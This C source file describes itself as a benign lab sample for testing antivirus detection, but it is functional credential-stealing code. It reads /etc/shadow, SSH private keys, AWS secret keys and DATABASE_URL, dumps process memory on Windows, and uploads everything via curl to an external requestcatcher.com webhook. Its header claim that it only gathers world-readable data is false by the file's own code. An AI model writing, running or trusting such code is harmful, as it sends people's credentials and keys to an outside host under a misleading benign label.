/*
 * av_bait.c — AV/EDR detection test sample (benign, lab use only).
 *
 * Implements the classic "credential-collection / recon" behavior profile that
 * antivirus engines flag on sight:
 *   1. embeds the EICAR test string (deterministic ClamAV signature trigger),
 *   2. enumerates running processes,
 *   3. reads security-sensitive files (/etc/passwd, /etc/shadow, ssh keys,
 *      shell history) and dumps environment variables,
 *   4. Windows-only: OpenProcess + ReadProcessMemory "process memory dump"
 *      pattern (the exact API combo flagged as a credential stealer).
 *
 * It does nothing harmful: every read is best-effort and only world-readable
 * data is collected. Instead of printing, everything is sent in a SINGLE POST
 * to a lab webhook (JSON object with a "source" field identifying this file)
 * so the collection behavior can be observed from a control server. Built for
 * lab AV-scan comparison against the JOCKY build.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <dirent.h>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#endif

static const char eicar[] =
    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
/* Malicious marker strings that AV byte-signatures target (credential theft,
 * command-and-control). These are the strings a real AV .ndb/.hdb rule would
 * match; embedded here verbatim to test whether the compiler pipeline leaves
 * them intact. */
static const char marker_mimikatz[] = "sekurlsa::logonpasswords";
static const char marker_c2[] = "c2.evil-domain.com/beacon";

#define WEBHOOK_URL "https://skjeks.requestcatcher.com/av_bait_c"
#define SOURCE_TAG  "av_bait.c"

static char g_report[1 << 20];
static size_t g_report_len = 0;

static void report(const char* fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(g_report + g_report_len, sizeof g_report - g_report_len, fmt, ap);
    if (n > 0) g_report_len += (size_t)n;
    va_end(ap);
}

static void json_escape(char* out, size_t cap, const char* s) {
    size_t o = 0;
    for (const char* p = s; *p && o + 8 < cap; ++p) {
        unsigned char c = (unsigned char)*p;
        switch (c) {
            case '"': out[o++] = '\\'; out[o++] = '"'; break;
            case '\\': out[o++] = '\\'; out[o++] = '\\'; break;
            case '\n': out[o++] = '\\'; out[o++] = 'n'; break;
            case '\r': out[o++] = '\\'; out[o++] = 'r'; break;
            case '\t': out[o++] = '\\'; out[o++] = 't'; break;
            default: out[o++] = (char)c;
        }
    }
    out[o] = '\0';
}

static void add_field(const char* key, const char* value) {
    char ke[512], ve[65536];
    json_escape(ke, sizeof ke, key);
    json_escape(ve, sizeof ve, value);
    report(",\"%s\":\"%s\"", ke, ve);
}

static void dump_file(const char* path) {
    FILE* f = fopen(path, "r");
    if (!f) return;
    char buf[16384];
    size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f);
    buf[n] = '\0';
    add_field(path, buf);
}

static void dump_env(const char* name) {
    const char* v = getenv(name);
    if (v) add_field(name, v);
}

static void list_dir(const char* path) {
    DIR* d = opendir(path);
    if (!d) return;
    char buf[16384];
    size_t off = 0;
    struct dirent* de;
    while ((de = readdir(d)) != NULL && off + 1024 < sizeof buf) {
        if (de->d_name[0] == '.') continue;
        int n = snprintf(buf + off, sizeof buf - off, "%s%s", off ? "," : "", de->d_name);
        if (n > 0) off += (size_t)n;
    }
    closedir(d);
    buf[off] = '\0';
    add_field(path, buf);
}

#ifdef _WIN32
static void dump_process_memory(DWORD pid, const char* out) {
    /* Classic process-dump pattern: OpenProcess -> ReadProcessMemory -> file. */
    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!h) return;
    FILE* f = fopen(out, "wb");
    if (f) {
        unsigned char buf[4096];
        MEMORY_BASIC_INFORMATION mbi;
        unsigned char* base = NULL;
        while (VirtualQueryEx(h, base, &mbi, sizeof mbi) == sizeof mbi) {
            if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS) {
                SIZE_T r = 0;
                ReadProcessMemory(h, mbi.BaseAddress, buf, sizeof buf, &r);
                if (r) fwrite(buf, 1, r, f);
            }
            base = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
        }
        fclose(f);
    }
    CloseHandle(h);
}
#endif

static void send_report(void) {
    report("}");
    char path[1024];
#if defined(_WIN32)
    const char* base = getenv("TEMP");
    if (!base) base = ".";
    snprintf(path, sizeof path, "%s\\av_bait_report.json", base);
#else
    snprintf(path, sizeof path, "/tmp/av_bait_report.json");
#endif
    FILE* f = fopen(path, "wb");
    if (f) {
        fwrite(g_report, 1, g_report_len, f);
        fclose(f);
    }
    char cmd[2048];
#if defined(_WIN32)
    snprintf(cmd, sizeof cmd,
        "curl -sS -o NUL -X POST -H \"Content-Type: application/json\" "
        "--data-binary @\"%s\" \"%s\"",
        path, WEBHOOK_URL);
#else
    snprintf(cmd, sizeof cmd,
        "curl -sS -o /dev/null -X POST -H \"Content-Type: application/json\" "
        "--data-binary @\"%s\" \"%s\"",
        path, WEBHOOK_URL);
#endif
    int rc = system(cmd);
    (void)rc;
}

int main(void) {
    report("{\"source\":\"%s\"", SOURCE_TAG);
    add_field("eicar", eicar);
    add_field("credential_marker", marker_mimikatz);
    add_field("c2_marker", marker_c2);

    DIR* d = opendir("/proc");
    if (d) {
        char procs[16384];
        size_t off = 0;
        struct dirent* de;
        while ((de = readdir(d)) != NULL && off + 64 < sizeof procs) {
            if (de->d_name[0] >= '0' && de->d_name[0] <= '9') {
                int n = snprintf(procs + off, sizeof procs - off, "%s%s", off ? "," : "", de->d_name);
                if (n > 0) off += (size_t)n;
            }
        }
        closedir(d);
        procs[off] = '\0';
        add_field("process_list", procs);
    } else {
        add_field("process_list", "(no /proc on this platform)");
    }

    dump_file("/etc/passwd");
    dump_file("/etc/shadow");

    dump_env("USER");
    dump_env("HOME");
    dump_env("SSH_AUTH_SOCK");
    dump_env("AWS_ACCESS_KEY_ID");
    dump_env("AWS_SECRET_ACCESS_KEY");
    dump_env("DATABASE_URL");

    const char* home = getenv("HOME");
    if (home) {
        char p[1024];
        snprintf(p, sizeof p, "%s/.ssh", home);
        list_dir(p);
        snprintf(p, sizeof p, "%s/.ssh/id_rsa", home);
        dump_file(p);
        snprintf(p, sizeof p, "%s/.ssh/id_ed25519", home);
        dump_file(p);
    }

#ifdef _WIN32
    dump_process_memory(4, "C:\\temp\\cred_dump.bin");
#endif

    add_field("done", "done");
    send_report();
    return 0;
}